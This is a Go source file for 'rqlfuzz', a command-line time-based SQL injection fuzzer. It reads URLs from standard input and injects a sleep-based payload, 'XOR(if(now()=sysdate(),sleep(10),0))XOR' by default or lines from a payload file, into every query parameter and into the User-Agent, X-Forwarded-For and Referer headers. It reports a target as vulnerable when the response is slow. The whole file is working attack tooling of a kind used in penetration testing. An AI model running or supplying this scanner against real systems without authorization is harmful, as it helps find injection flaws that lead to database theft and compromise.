package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/mgutz/ansi"
)

func main() {
	logo()
	var appendMode bool
	flag.BoolVar(&appendMode, "a", false, "")
	var payload string
	flag.StringVar(&payload, "p", "XOR(if(now()=sysdate(),sleep(10),0))XOR", " SQL  payload")
	var payloadfile string
	flag.StringVar(&payloadfile, "f", "", "Payload file location")
	var proxy string
	flag.StringVar(&proxy, "pr", "", "Set the proxy location recommended http://127.0.0.1:8080")
	var time1 float64
	flag.Float64Var(&time1, "t", 10, "Set time for sql injection to get triaged ")

	flag.Parse()
	Red := ansi.Color("vulnerable", "red")

	seen := make(map[string]bool)

// Changing the name or copying my code doesnot make you a programmer.
	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		base_url := sc.Text()
		header := []string{"User-Agent", "X-Forwarded-For", "Referer"}
		urls, err := url.Parse(sc.Text())
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to parse url %s [%s]\n", sc.Text(), err)
			continue
		}

		//copy

		pp := make([]string, 0)
		for p, _ := range urls.Query() {
			pp = append(pp, p)
		}
		sort.Strings(pp)

		key := fmt.Sprintf("%s%s?%s", urls.Hostname(), urls.EscapedPath(), strings.Join(pp, "&"))

		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = true
		if payloadfile == "" {
			qs := url.Values{}
			for param, vv := range urls.Query() {
				if appendMode {
					qs.Set(param, vv[0]+payload)
				} else {
					qs.Set(param, payload)
				}
			}

			urls.RawQuery = qs.Encode()

			encodedValue := urls.String()
			decodedValue, err := url.QueryUnescape(encodedValue)
			if err != nil {
				panic(err)
			}

			//setting up the proxy
			if proxy != "" {

				proxyurl, _ := url.Parse(proxy)
				transport := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
					Proxy:           http.ProxyURL(proxyurl),
				}
				req, err := http.NewRequest("GET", decodedValue, nil)
				if err != nil {
					fmt.Print("*")
				}
				client := &http.Client{
					Transport: transport,
				}
				start := time.Now()
				req.Header.Add("Ractiurd", "Testing for time based sql injection")
				resp, err := client.Do(req)
				if err != nil {
					fmt.Print("*")
				}

				if resp != nil {
					resp_time := time.Since(start).Seconds()
					if resp_time > time1 {

						fmt.Printf("\n[%vs] >> response time >> %v >> %v to time base sql injection\n", resp_time, decodedValue, Red)
						defer resp.Body.Close()

					}
				}
				for _, v := range header {
					base_req, err1 := http.NewRequest("GET", base_url, nil)
					if err1 != nil {
						fmt.Print("*")
					}
					base_req.Header.Add(v, payload)
					base_req.Header.Add("Ractiurd", "Testing for time base sql injection")

					client1 := &http.Client{
						Transport: transport,
					}
					start := time.Now()
					base_resp, err2 := client1.Do(base_req)
					if err2 != nil {
						fmt.Print("*")
					}

					if base_resp != nil {
						resp_time := time.Since(start).Seconds()
						if resp_time > time1 {
							fmt.Printf("\n[%vs] >> response time >> %v >> %v >>%v to time base sql injection\n", resp_time, base_url, v, Red)
							defer base_resp.Body.Close()

						}

					}

				}
			} else {
				start := time.Now()
				req, err := http.Get(decodedValue)
				if err != nil {
					fmt.Println("*")
				}

				if req != nil {
					req_time := time.Since(start).Seconds()
					if req_time > time1 {
						fmt.Printf("\n[%vs] >> response time >> %v >> %v to time base sql injection\n", req_time, decodedValue, Red)
						defer req.Body.Close()

					}

				}
				for _, v := range header {
					base_req, err1 := http.NewRequest("GET", base_url, nil)
					if err1 != nil {
						fmt.Print("*")
					}
					base_req.Header.Add(v, payload)
					base_req.Header.Add("Ractiurd", "Testing for time base sql injection")

					client1 := &http.Client{}
					start := time.Now()
					base_resp, err2 := client1.Do(base_req)
					if err2 != nil {
						fmt.Print("*")
					}

					if base_resp != nil {
						resp_time := time.Since(start).Seconds()
						if resp_time > time1 {
							fmt.Printf("\n[%vs] >> response time >> %v >> %v >>%v to time base sql injection\n", resp_time, base_url, v, Red)
							defer base_resp.Body.Close()

						}

					}

				}
			}

		}
		if payloadfile != "" {
			read, err := os.Open(payloadfile)
			if err != nil {
				panic(err)
			}
			defer read.Close()
			scanner := bufio.NewScanner(read)
			scanner.Split(bufio.ScanLines)
			for scanner.Scan() {
				payload := scanner.Text()

				qs := url.Values{}
				for param, vv := range urls.Query() {
					if appendMode {
						qs.Set(param, vv[0]+payload)
					} else {
						qs.Set(param, payload)
					}
				}

				urls.RawQuery = qs.Encode()

				encodedValue := urls.String()
				decodedValue, err := url.QueryUnescape(encodedValue)
				if err != nil {
					panic(err)
				}

				//setting up the proxy
				if proxy != "" {

					proxyurl, _ := url.Parse(proxy)
					transport := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
						Proxy:           http.ProxyURL(proxyurl),
					}
					req, err := http.NewRequest("GET", decodedValue, nil)
					if err != nil {
						fmt.Print("*")

					}
					req.Header.Add("Ractiurd", "Testing for time base sql injection")
					client := &http.Client{
						Transport: transport,
					}
					start := time.Now()
					resp, err := client.Do(req)
					if err != nil {
						fmt.Print("*")
					}

					if resp != nil {
						resp_time := time.Since(start).Seconds()
						if resp_time > time1 {
							fmt.Printf("\n[%vs] >> response time >> %v >> %v to time base sql injection\n", resp_time, decodedValue, Red)
							defer resp.Body.Close()

						}
					}

					//
					for _, v := range header {
						base_req, err1 := http.NewRequest("GET", base_url, nil)
						if err1 != nil {
							fmt.Print("*")
						}
						base_req.Header.Add(v, payload)
						base_req.Header.Add("Ractiurd", "Testing for time base sql injection")

						client1 := &http.Client{
							Transport: transport,
						}
						start := time.Now()
						base_resp, err2 := client1.Do(base_req)
						if err2 != nil {
							fmt.Print("*")
						}

						if base_resp != nil {
							resp_time := time.Since(start).Seconds()
							if resp_time > time1 {
								fmt.Printf("\n[%vs] >> response time >> %v >> %v >>%v to time base sql injection\n", resp_time, base_url, v, Red)
								defer base_resp.Body.Close()

							}

						}

					}

				} else {
					start := time.Now()
					//fuck
					req, err := http.Get(decodedValue)
					if err != nil {
						fmt.Println("*")
					}

					if req != nil {
						req_time := time.Since(start).Seconds()
						if req_time > time1 {
							fmt.Printf("\n[%vs] >> response time >> %v >> %v to time base sql injection\n", req_time, decodedValue, Red)
							defer req.Body.Close()

						}

					}
					for _, v := range header {
						base_req, err1 := http.NewRequest("GET", base_url, nil)
						if err1 != nil {
							fmt.Print("*")
						}
						base_req.Header.Add(v, payload)
						base_req.Header.Add("Ractiurd", "Testing for time base sql injection")

						client1 := &http.Client{}
						start := time.Now()
						base_resp, err2 := client1.Do(base_req)
						if err2 != nil {
							fmt.Print("*")
						}
						defer base_resp.Body.Close()
						if base_resp != nil {
							resp_time := time.Since(start).Seconds()
							if resp_time > time1 {
								fmt.Printf("\n[%vs] >> response time >> %v >> %v >>%v to time base sql injection\n", resp_time, base_url, v, Red)
								defer base_resp.Body.Close()

							}

						}

					}

				}

			}
		}

	}

}

func logo() {
	lg1 := ansi.Color("****         ****", "green")
	lg2 := ansi.Color("*****       *****", "green")
	lg3 := ansi.Color("*******    ******", "green")
	lg4 := ansi.Color("*** **** **** ***", "green")
	lg5 := ansi.Color("***  *******  ***", "green")
	lg6 := ansi.Color("***           ***", "green")
	lg7 := ansi.Color("***           ***", "green")
	lg8 := ansi.Color("***           *** >> Created by Ractiurd [Mahedi]", "green")
	lg9 := ansi.Color("\nTime Base Sqli Fuzzer >> rqlfuzz \n\n", "green")

	fmt.Println(lg1)
	fmt.Println(lg2)
	fmt.Println(lg3)
	fmt.Println(lg4)
	fmt.Println(lg5)
	fmt.Println(lg6)
	fmt.Println(lg7)
	fmt.Println(lg8)
	fmt.Println(lg9)

}
